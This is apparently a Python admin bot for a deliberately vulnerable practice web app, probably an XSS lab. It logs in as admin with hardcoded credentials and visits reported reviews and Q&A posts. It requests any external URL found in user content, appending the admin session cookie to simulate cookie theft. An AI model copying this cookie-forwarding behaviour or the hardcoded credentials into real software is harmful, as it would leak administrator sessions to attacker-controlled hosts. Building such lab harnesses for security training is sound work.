"""
관리자 자동화 봇.

- 신고 접수된 리뷰, "문의"/"환불" 키워드가 포함된 Q&A 를 주기적으로 방문한다.
- 가벼운 requests 기반 HTTP 클라이언트로, 페이지 내 사용자 입력 영역에 포함된
  외부 리소스(<img src="...">, fetch(...)) 요청을 브라우저처럼 재현한다.
- 무거운 Playwright 등은 사용하지 않는다.
"""
import re
import threading
import time

import requests

BASE_URL = "http://127.0.0.1:5000"
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin1234"
POLL_INTERVAL_SEC = 20

# 사용자 입력 영역(user-content)만 대상으로 검사한다.
_USER_CONTENT_BLOCK_PATTERN = re.compile(
    r'class="[^"]*\buser-content\b[^"]*"[^>]*>(.*?)</(?:div|p)>',
    re.IGNORECASE | re.DOTALL,
)
_EXTERNAL_URL_PATTERN = re.compile(
    r"""(?:src|href)\s*=\s*["']((?:https?:)?//(?!127\.0\.0\.1|localhost)[^"']+)["']""",
    re.IGNORECASE,
)
_FETCH_URL_PATTERN = re.compile(
    r"""fetch\(\s*["']((?:https?:)?//(?!127\.0\.0\.1|localhost)[^"']+)["']""",
    re.IGNORECASE,
)


def _login_as_admin():
    s = requests.Session()
    try:
        s.post(
            f"{BASE_URL}/login",
            data={"username": ADMIN_USERNAME, "password": ADMIN_PASSWORD},
            timeout=5,
            allow_redirects=True,
        )
    except requests.RequestException as e:
        print(f"[admin-bot] 로그인 실패: {e}")
        return None
    return s


def _simulate_external_requests(session: requests.Session, html: str, source_label: str):
    # 페이지 전체가 아니라, 실제 사용자 입력이 렌더링되는 부분(user-content)만 골라서 검사한다.
    content_blocks = _USER_CONTENT_BLOCK_PATTERN.findall(html)
    if not content_blocks:
        return

    urls = set()
    for block in content_blocks:
        urls |= set(_EXTERNAL_URL_PATTERN.findall(block))
        urls |= set(_FETCH_URL_PATTERN.findall(block))

    admin_sid = session.cookies.get("sid", "")

    for url in urls:
        if url.startswith("//"):
            url = "https:" + url
        try:
            # 실제 브라우저에서 document.cookie 등으로 탈취된 값을 함께 보내는 상황을 흉내낸다.
            beacon_url = url + ("&" if "?" in url else "?") + f"admin_sid={admin_sid}"
            requests.get(beacon_url, timeout=5)
            print(f"[admin-bot] 🚨 외부 리소스 자동 요청 발생 ({source_label}): {url}")
        except requests.RequestException:
            pass


def _visit_reported_content(session: requests.Session):
    try:
        resp = session.get(f"{BASE_URL}/admin/reported", timeout=5)
    except requests.RequestException as e:
        print(f"[admin-bot] 신고 목록 조회 실패: {e}")
        return
    if resp.status_code != 200:
        return

    _simulate_external_requests(session, resp.text, "신고글 목록 페이지")

    # 개별 리뷰/Q&A 상세도 방문
    review_ids = re.findall(r"/reviews/(\d+)/report", resp.text)
    product_ids = re.findall(r"/products/(\d+)#review", resp.text)
    for pid in set(product_ids):
        try:
            detail = session.get(f"{BASE_URL}/products/{pid}", timeout=5)
            _simulate_external_requests(session, detail.text, f"상품#{pid} 상세(리뷰)")
        except requests.RequestException:
            pass

    board_ids = re.findall(r"/board/qna/(\d+)", resp.text)
    for bid in set(board_ids):
        try:
            detail = session.get(f"{BASE_URL}/board/qna/{bid}", timeout=5)
            _simulate_external_requests(session, detail.text, f"Q&A게시판#{bid} 상세")
        except requests.RequestException:
            pass


def _bot_loop():
    print(f"[admin-bot] 시작됨 (관리자 계정: {ADMIN_USERNAME}, 주기: {POLL_INTERVAL_SEC}초)")
    time.sleep(3)  # 서버 기동 대기
    while True:
        session = _login_as_admin()
        if session:
            _visit_reported_content(session)
        time.sleep(POLL_INTERVAL_SEC)


def start_bot_thread():
    t = threading.Thread(target=_bot_loop, daemon=True)
    t.start()
    return t
